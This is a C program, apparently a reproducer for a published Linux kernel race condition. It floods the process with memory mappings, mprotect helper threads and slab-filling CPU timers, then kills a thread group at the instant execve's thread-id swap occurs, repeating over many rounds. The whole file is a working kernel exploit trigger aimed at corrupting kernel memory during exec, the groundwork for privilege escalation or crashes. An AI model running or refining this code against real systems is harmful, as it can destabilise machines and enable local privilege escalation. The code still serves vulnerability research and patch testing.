/*
 * race - reproduce the published trigger's timing mechanism:
 * a killer helper polls tgkill(tgid, old_exec_tid, 0) and fires SIGKILL the
 * instant de_thread()'s exchange_tids() makes that tid vanish (ESRCH).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <pthread.h>
#include <stdint.h>
#include <stdatomic.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sched.h>

#define NVMA 50000
#define N_TIMERS 2048
#define ARMED_INDEX 1024
#define KVA 0xffff000000000000ULL

static _Atomic int g_exec_tid;
static _Atomic int g_stop;
static _Atomic int g_go;
static _Atomic int g_in_mprotect;
static void *g_vmas;
static size_t g_vmalen;
static int g_vmafd;

static void noop(int s) { (void)s; }
static int pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    return sched_setaffinity(0, sizeof(set), &set);
}

static int prepare_vmas(void)
{
    long page = sysconf(_SC_PAGESIZE);
    int i;
    g_vmafd = (int)syscall(SYS_memfd_create, "v", 1);
    if (g_vmafd < 0 || ftruncate(g_vmafd, page)) return -1;
    g_vmalen = (size_t)NVMA * (size_t)page;
    g_vmas = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (g_vmas == MAP_FAILED) return -1;
    for (i = 0; i < NVMA; i++) {
        void *at = (char *)g_vmas + (size_t)i * (size_t)page;
        if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, g_vmafd, 0) != at)
            return -1;
    }
    return 0;
}

static int locker_fn(void *arg)
{
    int prot = PROT_NONE;
    (void)arg;
    while (!atomic_load(&g_go)) { if (atomic_load(&g_stop)) return 0; sched_yield(); }
    while (!atomic_load(&g_stop)) {
        atomic_store(&g_in_mprotect, 1);
        mprotect(g_vmas, g_vmalen, prot);
        atomic_store(&g_in_mprotect, 0);
        prot = (prot == PROT_NONE) ? PROT_READ : PROT_NONE;
    }
    return 0;
}

static int killer_fn(void *arg)
{
    int tgid = (int)(intptr_t)arg;
    int old;
    while (!(old = atomic_load(&g_exec_tid))) {
        if (atomic_load(&g_stop)) return 0;
        sched_yield();
    }
    for (;;) {
        if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH) break;
        if (atomic_load(&g_stop)) return 0;
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    return 0;
}

#define HELPER_STACK (1 << 20)
static int spawn_helper(int (*fn)(void *), void *arg)
{
    void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
    if (stack == MAP_FAILED) return -1;
    return (int)clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
}

static void *exec_fn(void *arg)
{
    static timer_t many[N_TIMERS];
    struct sigevent plain, armed_ev;
    struct itimerspec spec;
    char *argv[] = { (char *)"race", (char *)"--exec-ok", NULL };
    int i;
    (void)arg;

    memset(&plain, 0, sizeof(plain));
    plain.sigev_notify = SIGEV_NONE;              /* slab filler */
    memset(&armed_ev, 0, sizeof(armed_ev));
    armed_ev.sigev_notify = SIGEV_SIGNAL;         /* the one that queues */
    armed_ev.sigev_signo = SIGRTMIN;
    memset(&spec, 0, sizeof(spec));
    spec.it_value.tv_sec = 3600;

    if (pin_cpu(0)) _exit(116);
    for (i = 0; i < N_TIMERS; i++) {
        if (timer_create(CLOCK_THREAD_CPUTIME_ID, i == ARMED_INDEX ? &armed_ev : &plain, &many[i]))
            _exit(120);
        if (i == ARMED_INDEX && timer_settime(many[i], 0, &spec, NULL)) _exit(120);
    }
    atomic_store(&g_exec_tid, (int)syscall(SYS_gettid));
    atomic_store(&g_go, 1);
    while (!atomic_load(&g_in_mprotect)) { if (atomic_load(&g_stop)) _exit(123); sched_yield(); }
    dprintf(2, "[exec] execve tid=%ld\n", (long)syscall(SYS_gettid));
    execve("/proc/self/exe", argv, NULL);
    _exit(122);
}

static int child_race(void)
{
    pthread_t th;
    sigset_t block;
    int tgid = (int)getpid();
    int i;

    sigemptyset(&block); sigaddset(&block, SIGRTMIN);
    sigprocmask(SIG_BLOCK, &block, NULL);
    if (prepare_vmas()) _exit(110);
    if (pin_cpu(1)) _exit(115);
    for (i = 0; i < 3; i++) if (spawn_helper(locker_fn, NULL) < 0) _exit(111);
    if (spawn_helper(killer_fn, (void *)(intptr_t)tgid) < 0) _exit(112);
    if (pthread_create(&th, NULL, exec_fn, NULL)) _exit(114);
    for (;;) pause();
}

int main(int argc, char **argv)
{
    int rounds = argc > 1 ? atoi(argv[1]) : 10;
    int i, killed = 0;

    if (argc > 1 && !strcmp(argv[1], "--exec-ok")) return 0;
    printf("=== race (tid-swap driven kill), %d rounds ===\n", rounds);

    for (i = 0; i < rounds; i++) {
        pid_t child;
        int st = 0, waited = 0;
        atomic_store(&g_stop, 0);
        atomic_store(&g_go, 0);
        atomic_store(&g_in_mprotect, 0);
        atomic_store(&g_exec_tid, 0);

        child = fork();
        if (child == 0) child_race();
        if (child < 0) break;

        for (;;) {
            pid_t r = waitpid(child, &st, WNOHANG);
            if (r == child) break;
            if (waited > 3000) { kill(child, SIGKILL); waitpid(child, &st, 0); break; }
            usleep(1000);
            waited++;
        }
        if (WIFSIGNALED(st)) {
            killed++;
            printf("  round %d: child killed by signal %d after ~%dms\n", i, WTERMSIG(st), waited);
        } else {
            printf("  round %d: child not signalled (status=0x%x, %dms)\n", i, st, waited);
        }
    }
    printf("race done: signalled=%d/%d\n", killed, rounds);
    return 0;
}
